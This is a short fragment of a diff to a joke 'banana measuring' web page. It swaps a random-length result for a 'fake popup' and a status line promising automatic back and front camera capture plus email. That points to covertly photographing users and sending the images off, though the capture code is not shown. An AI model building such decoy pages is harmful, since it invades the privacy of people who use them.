+    hideFakePopup();
   }
 
-  function updateTimer(secs) {
-    const m = String(Math.floor(secs / 60)).padStart(2, '0');
-    const s = String(secs % 60).padStart(2, '0');
-    timerDisplay.textContent = `${m}:${s}`;
-  }
+  // Close fake popup manually
+  closePopupBtn.addEventListener('click', () => {
+    hideFakePopup();
+  });
 
-  function showResult() {
-    const cm = (Math.random() * 8 + 14).toFixed(1);
-    status.innerHTML = `✅ Analysis complete! Your banana is <strong>${cm} cm</strong> long 🍌`;
-  }
+  // initial UI state
+  window.onload = () => {
+    updateThumbnails();
+    btnCapture.disabled = true;
+    btnRetake.style.display = 'none';
+    btnStart.disabled = false;
+    statusDiv.textContent = '🍌 Open back camera, then press Capture (auto back+front + email)';
+  };
 </script>
 </body>
 </html>
